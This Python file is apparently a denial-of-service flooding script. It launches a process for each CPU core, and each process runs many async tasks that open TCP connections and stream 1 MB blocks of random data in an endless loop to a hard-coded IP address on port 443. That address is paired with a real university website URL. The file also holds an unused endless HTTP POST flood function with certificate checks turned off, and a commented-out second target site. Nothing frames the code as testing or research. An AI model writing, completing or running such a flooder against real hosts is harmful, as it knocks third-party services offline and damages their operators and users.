import random 
import asyncio, uvloop
from aiohttp import ClientSession
import multiprocessing
from rich import traceback
traceback.install()
import sys
import platform

import os
import psutil
import selectors
import socket
import ssl
import time

from headres import getHeaders

asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())


SOCK_BUFFER_SIZE = 1024 * 1024 # 1 MB
MAX_UDP_PACKET_SIZE = 65507 # Maximum size for UDP packet payload
MAX_TCP_PACKET_SIZE = 1024 * 1024  
MAX_HTTP_PACKET_SIZE = 16 * 1024 * 1024  # 16 MB

CONCURRENCY_LEVEL = 1


CONCURRENT_WORKERS = multiprocessing.cpu_count() 





def randomize_cpu():
    current_pid = os.getpid()

    cpu_count = os.cpu_count()
    print(f"CPU Count: {cpu_count}")

    cpu_ids = list(range(cpu_count))

    print(f"Available CPU IDs: {cpu_ids}")
    # cpu_ids = random.sample(range(cpu_count), random.randint(1, cpu_count))

    # print(f"Selected CPU IDs for affinity: {cpu_ids}")

    if platform.system() == "Linux":
        try:
            os.sched_setaffinity(current_pid, cpu_ids)
            print(f"Set CPU affinity for PID {current_pid} to CPUs: {cpu_ids}")
        except AttributeError as e:
            print(f"Failed to set CPU affinity: {e}")


    time.sleep(1)
# randomize_cpu()



async def send_tcp_packet(
        target,
        port,
        selector,
        packet_size=MAX_TCP_PACKET_SIZE,
):
    sock = None
    loop = asyncio.get_event_loop()
    try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFFER_SIZE)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFFER_SIZE)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)        
        sock.setblocking(False)


        await loop.sock_connect(sock, (target, port))
        
        
        while True:
            try: 
                await loop.sock_sendall(sock, os.urandom(packet_size))
                await asyncio.sleep(0.01)
            except Exception as e:
                print(f"Send Error: {e}")
                # break

    except Exception as e:
        print(f"TCP Error: {e}")
    finally:

        if sock:
            try:
                sock.close()
            except Exception as e:
                print(f"Socket Close Error: {e}")
            pass


"""


    target = '192.168.1.172'
    port = 80
    selector = selectors.DefaultSelector()

    task = []

    for _ in range(CONCURRENCY_LEVEL):
        task.append(
            asyncio.create_task(
                send_tcp_packet(target, port, selector)
            )
        )

    await asyncio.gather(*task)

"""

async def send_http_request(
        url: str,
        payload: dict,
        session: ClientSession,
        packet_size=MAX_HTTP_PACKET_SIZE,
        sem: asyncio.Semaphore = None,
):
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    pid = os.getpid()

    # for i in  range(CONCURRENCY_LEVEL):
    while True:
    
        try:
            async with session.post(
                url,
                # json=payload
            ) as resp:
                status = resp.status

                print(f"worker -> {pid} | HTTP Status: {status}")
            
        except Exception as exc:
            print(f"HTTP  Request error: {type(exc).__name__}: {exc}")
            
                







async def main():

    randomize_cpu()
    payload = {
        "mobile":"998931234567",
        "password": os.urandom(CONCURRENCY_LEVEL).hex(),
        "equipment":1
    }
    # target_url = "https://www.engineeredarts.net"
    # LOGIN_API_ENDPOINT = "/api/login"

    target_url = "https://duikt.edu.ua/"

    target_ip = '86.111.90.254'
    target_port = 443

        
        
    print(f"Payload Size: {sys.getsizeof(payload)} bytes")
    time.sleep(1)
    tasks = []
    for i in range(CONCURRENT_WORKERS):
        t = asyncio.create_task(send_tcp_packet(
            target=target_ip,
            port=target_port,
            selector=selectors.DefaultSelector(),
        ))
        tasks.append(t)

        print(f"Started TCP task {i} in process {os.getpid()}")
    # for t in tasks:
    #     t.cancel()


    await asyncio.gather(*tasks, return_exceptions=True)


    
if __name__ == "__main__":


    NUM_PROCESSES = multiprocessing.cpu_count()

    processes = []


    for i in range(NUM_PROCESSES):
        p = multiprocessing.Process(target=asyncio.run, args=(main(),))
        processes.append(p)
        p.start()

    try:
        for p in processes:
            p.join()

    except KeyboardInterrupt:
        print("Terminating processes...")
        for p in processes:
            p.terminate()
        for p in processes:
            p.join()
        print("All processes terminated.")

    # asyncio.run(main())


"""

sem = asyncio.Semaphore(CONCURRENCY_LEVEL)

        tasks = []

        payload = {
            "data": os.urandom(1024).hex()  # Example payload with random data
        }

        for _ in range(CONCURRENCY_LEVEL):
            tasks.append(
                asyncio.create_task(
                    send_http_request(
                        target_url,
                        payload,
                        session,
                        sem
                    )
                )
            )

        await asyncio.gather(*tasks)



"""
